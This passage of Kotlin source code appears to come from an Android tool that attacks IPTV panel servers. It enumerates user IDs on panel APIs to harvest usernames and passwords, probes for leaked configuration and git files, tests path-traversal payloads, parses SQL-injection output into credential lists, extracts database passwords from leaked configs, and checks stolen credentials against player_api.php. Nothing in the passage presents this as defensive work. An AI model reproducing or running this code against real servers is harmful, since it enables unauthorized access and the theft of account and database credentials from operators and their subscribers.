                if (body.contains("username", ignoreCase = true) ||
                    body.contains("password", ignoreCase = true) ||
                    body.contains("user_info", ignoreCase = true) ||
                    body.contains("result", ignoreCase = true) ||
                    body.contains("\"data\"", ignoreCase = true)) {
                    return body
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testApiEndpoint(baseUrl: String, endpoint: String): String? {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$endpoint")
                .get()
                .addHeader("User-Agent", "Mozilla/5.0")
                .addHeader("Accept", "application/json")
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            val code = response.code
            response.close()
            
            if (code in 200..299 && body.length > 50) {
                // Check for user data indicators
                if (body.contains("username") && body.contains("password")) {
                    return body
                }
                if (body.contains("user_info") || body.contains("\"users\"")) {
                    return body
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testUserIdEnumeration(baseUrl: String, userId: Int): FoundCredential? {
        return try {
            val endpoints = listOf(
                "$baseUrl/api.php?action=user&sub=info&id=$userId",
                "$baseUrl/panel_api.php?action=get_user&id=$userId",
                "$baseUrl/api.php?action=user&sub=info&user_id=$userId"
            )
            
            for (endpoint in endpoints) {
                val request = Request.Builder()
                    .url(endpoint)
                    .get()
                    .addHeader("User-Agent", "Mozilla/5.0")
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                if (body.contains("username") && body.contains("password")) {
                    val creds = parseApiResponse(body, baseUrl)
                    if (creds.isNotEmpty()) {
                        return creds.first()
                    }
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testPanelApiEndpoint(baseUrl: String, endpoint: String): String? {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$endpoint")
                .get()
                .addHeader("User-Agent", "Mozilla/5.0")
                .addHeader("X-Requested-With", "XMLHttpRequest")
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            val code = response.code
            response.close()
            
            if (code in 200..299 && body.length > 50) {
                if (body.contains("username") || body.contains("user_info") || body.contains("\"data\"")) {
                    return body
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testConfigLeak(baseUrl: String, file: String): String? {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$file")
                .get()
                .addHeader("User-Agent", "Mozilla/5.0")
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            val code = response.code
            response.close()
            
            if (code in 200..299 && body.length > 20) {
                // Check for sensitive content indicators
                if (body.contains("DB_HOST", ignoreCase = true) ||
                    body.contains("DB_PASSWORD", ignoreCase = true) ||
                    body.contains("mysql_connect", ignoreCase = true) ||
                    body.contains("<?php", ignoreCase = true) ||
                    body.contains("password", ignoreCase = true) ||
                    body.contains("secret", ignoreCase = true) ||
                    body.contains("api_key", ignoreCase = true) ||
                    body.contains("CREATE TABLE", ignoreCase = true) ||
                    body.contains("INSERT INTO", ignoreCase = true) ||
                    body.contains("[core]", ignoreCase = true)) { // git config
                    return body
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    // ═══════════════════════════════════════════════════════════════
    // PARSING HELPER METHODS
    // ═══════════════════════════════════════════════════════════════
    
    private fun parseSqlInjectionResult(response: String, baseUrl: String): List<FoundCredential> {
        val credentials = mutableListOf<FoundCredential>()
        
        try {
            // Try to parse as JSON
            if (response.trim().startsWith("{") || response.trim().startsWith("[")) {
                val creds = parseApiResponse(response, baseUrl)
                credentials.addAll(creds)
            }
            
            // Try to extract from raw SQL dump format
            // Format: username|password or username:password
            val lines = response.split("\n", "\r\n", "|", ",")
            for (line in lines) {
                val parts = line.split(":", "|", "\t")
                if (parts.size >= 2) {
                    val username = parts[0].trim()
                    val password = parts[1].trim()
                    if (username.isNotEmpty() && password.isNotEmpty() && 
                        username.length < 50 && password.length < 100 &&
                        !username.contains(" ") && !username.contains("<")) {
                        credentials.add(FoundCredential(
                            username = username,
                            password = password,
                            panelUrl = baseUrl,
                            userInfo = null
                        ))
                    }
                }
            }
        } catch (e: Exception) {
            // Parsing failed
        }
        
        return credentials.distinctBy { it.username }
    }
    
    private fun parseApiResponse(response: String, baseUrl: String): List<FoundCredential> {
        val credentials = mutableListOf<FoundCredential>()
        
        try {
            val json = if (response.trim().startsWith("[")) {
                JSONArray(response)
            } else if (response.trim().startsWith("{")) {
                val obj = JSONObject(response)
                // Check for nested arrays
                when {
                    obj.has("data") -> obj.optJSONArray("data") ?: JSONArray().put(obj)
                    obj.has("users") -> obj.optJSONArray("users") ?: JSONArray().put(obj)
                    obj.has("user_info") -> JSONArray().put(obj.getJSONObject("user_info"))
                    else -> JSONArray().put(obj)
                }
            } else {
                return credentials
            }
            
            for (i in 0 until json.length()) {
                val item = json.optJSONObject(i) ?: continue
                
                val username = item.optString("username", "")
                val password = item.optString("password", "")
                
                if (username.isNotEmpty() && password.isNotEmpty()) {
                    val userInfo = UserInfo(
                        username = username,
                        password = password,
                        status = item.optString("status", "Unknown"),
                        expDate = item.optString("exp_date", null).takeIf { it.isNotEmpty() },
                        activeCons = item.optInt("active_cons", 0),
                        maxConnections = item.optInt("max_connections", 1),
                        isTrial = item.optInt("is_trial", 0) == 1,
                        createdAt = item.optString("created_at", null).takeIf { it.isNotEmpty() }
                    )
                    
                    credentials.add(FoundCredential(
                        username = username,
                        password = password,
                        panelUrl = baseUrl,
                        userInfo = userInfo
                    ))
                }
            }
        } catch (e: Exception) {
            // JSON parsing failed, try regex
            val usernameRegex = """"username"\s*:\s*"([^"]+)"""".toRegex()
            val passwordRegex = """"password"\s*:\s*"([^"]+)"""".toRegex()
            
            val usernames = usernameRegex.findAll(response).map { it.groupValues[1] }.toList()
            val passwords = passwordRegex.findAll(response).map { it.groupValues[1] }.toList()
            
            for (i in 0 until minOf(usernames.size, passwords.size)) {
                credentials.add(FoundCredential(
                    username = usernames[i],
                    password = passwords[i],
                    panelUrl = baseUrl,
                    userInfo = null
                ))
            }
        }
        
        return credentials.distinctBy { it.username }
    }
    
    private fun parseConfigFile(content: String, baseUrl: String): FoundCredential? {
        try {
            // Try to extract database credentials from config files
            val dbUserRegex = """(?:DB_USER|db_user|mysql_user|database_user)\s*[=:]\s*['"]?([^'";\s]+)""".toRegex(RegexOption.IGNORE_CASE)
            val dbPassRegex = """(?:DB_PASS|db_pass|mysql_pass|database_pass|DB_PASSWORD)\s*[=:]\s*['"]?([^'";\s]+)""".toRegex(RegexOption.IGNORE_CASE)
            
            val dbUser = dbUserRegex.find(content)?.groupValues?.get(1)
            val dbPass = dbPassRegex.find(content)?.groupValues?.get(1)
            
            if (dbUser != null && dbPass != null) {
                return FoundCredential(
                    username = "DB: $dbUser",
                    password = dbPass,
                    panelUrl = baseUrl,
                    userInfo = null
                )
            }
        } catch (e: Exception) {
            // Parsing failed
        }
        return null
    }

    override suspend fun testCredential(
        panelUrl: String,
        port: Int,
        username: String,
        password: String
    ): FoundCredential? = withContext(Dispatchers.IO) {
        val baseUrl = buildBaseUrl(panelUrl, port)
        val response = makeApiRequest(baseUrl, username, password)
        
        if (response != null) {
            try {
                val json = JSONObject(response)
                val userInfo = json.optJSONObject("user_info")
                
                if (userInfo != null && userInfo.optString("auth", "0") == "1") {
                    val info = UserInfo(
                        username = userInfo.optString("username", username),
                        password = userInfo.optString("password", password),
                        status = userInfo.optString("status", "Unknown"),
                        expDate = userInfo.optString("exp_date", null),
                        activeCons = userInfo.optInt("active_cons", 0),
                        maxConnections = userInfo.optInt("max_connections", 1),
                        isTrial = userInfo.optInt("is_trial", 0) == 1,
                        createdAt = userInfo.optString("created_at", null)
                    )
                    
                    return@withContext FoundCredential(
                        username = username,
                        password = password,
                        panelUrl = baseUrl,
                        userInfo = info
                    )
                }
            } catch (e: Exception) {
                // JSON parse error, not a valid response
            }
        }
        
        null
    }

    override suspend fun checkPanelReachable(panelUrl: String, port: Int): Boolean = withContext(Dispatchers.IO) {
        try {
            val baseUrl = buildBaseUrl(panelUrl, port)
            val request = Request.Builder()
                .url("$baseUrl/player_api.php")
                .head()
                .build()
            
            val response = client.newCall(request).execute()
            response.close()
            true
        } catch (e: Exception) {
            false
        }
    }
    
    private fun buildBaseUrl(panelUrl: String, port: Int): String {
        var url = panelUrl.trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "http://$url"
        }
        url = url.trimEnd('/')
        
        // Add port if not already in URL
        if (!url.contains(":$port") && !url.contains(":80") && !url.contains(":443")) {
            val protocolEnd = url.indexOf("://") + 3
            val pathStart = url.indexOf("/", protocolEnd).takeIf { it > 0 } ?: url.length
            val hostPart = url.substring(0, pathStart)
            val pathPart = url.substring(pathStart)
            url = "$hostPart:$port$pathPart"
        }
        
        return url
    }
    
    private fun makeApiRequest(baseUrl: String, username: String, password: String): String? {
        return try {
            val url = "$baseUrl/player_api.php?username=$username&password=$password"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string()
            response.close()
            body
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testPathTraversal(baseUrl: String, payload: String): Boolean {
        return try {
            val url = "$baseUrl/$payload"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            response.close()
            
            // Check for common indicators of successful path traversal
            body.contains("root:") || 
            body.contains("[boot loader]") ||
            body.contains("<?php") ||
            body.contains("DB_HOST") ||
            body.contains("mysql_")
        } catch (e: Exception) {
            false
        }
    }
    
    private fun testEndpoint(baseUrl: String, endpoint: String): Triple<Boolean, Int, Boolean> {
        return try {
            val url = "$baseUrl$endpoint"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val statusCode = response.code
            val body = response.body?.string() ?: ""
            response.close()
            
            val accessible = statusCode in 200..399
            val hasContent = body.length > 50 && !body.contains("404") && !body.contains("Not Found")
            
            Triple(accessible, statusCode, hasContent)
        } catch (e: Exception) {
            Triple(false, 0, false)
        }
    }
}
